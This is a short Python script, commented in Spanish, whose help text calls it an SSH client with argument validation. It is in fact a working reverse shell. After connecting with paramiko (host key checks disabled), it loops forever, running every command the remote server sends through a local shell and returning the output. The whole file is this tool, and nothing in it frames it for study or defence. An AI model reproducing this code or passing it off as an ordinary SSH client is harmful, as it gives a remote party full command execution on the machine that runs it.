import subprocess
import paramiko
import re
import socket
import argparse


def validar_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def validar_puerto(puerto):
    try:
        puerto_int = int(puerto)
        return 1 <= puerto_int <= 65535
    except ValueError:
        return False


def validar_usuario(usuario):
    return len(usuario.strip()) > 0 and not usuario.isspace()


def validar_contrasena(contrasena):
    return len(contrasena) > 0


def validar_comando(comando):
    return len(comando.strip()) > 0 and not comando.isspace()


def comando_ssh(ip, puerto, usuario, contrasena, comando):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cliente.connect(ip, port=puerto, username=usuario, password=contrasena)
    sesion_ssh = cliente.get_transport().open_session()
    if sesion_ssh.active:
        sesion_ssh.send(comando)
        print(sesion_ssh.recv(1024))

        while True:
            comando = sesion_ssh.recv(1024)
            try:
                salida_comando = subprocess.check_output(comando.decode(), shell=True)
                sesion_ssh.send(salida_comando)
            except Exception as e:
                sesion_ssh.send(str(e))
    cliente.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Cliente SSH con validación de argumentos"
    )
    parser.add_argument("--ip", "-i", required=True, help="Dirección IP del servidor")
    parser.add_argument(
        "--puerto", "-p", type=int, default=22, help="Puerto SSH (default: 22)"
    )
    parser.add_argument("--usuario", "-u", required=True, help="Nombre de usuario")
    parser.add_argument("--contrasena", "-c", required=True, help="Contraseña")
    parser.add_argument("--comando", "-cmd", required=True, help="Comando a ejecutar")

    args = parser.parse_args()

    if not validar_ip(args.ip):
        print("Error: Dirección IP inválida.")
        exit(1)

    if not validar_puerto(args.puerto):
        print("Error: Puerto inválido. Debe ser un número entre 1 y 65535.")
        exit(1)

    if not validar_usuario(args.usuario):
        print("Error: Nombre de usuario inválido.")
        exit(1)

    if not validar_contrasena(args.contrasena):
        print("Error: Contraseña inválida.")
        exit(1)

    if not validar_comando(args.comando):
        print("Error: Comando inválido.")
        exit(1)

    print(f"Conectando a {args.ip}:{args.puerto} con usuario '{args.usuario}'...")
    comando_ssh(args.ip, args.puerto, args.usuario, args.contrasena, args.comando)
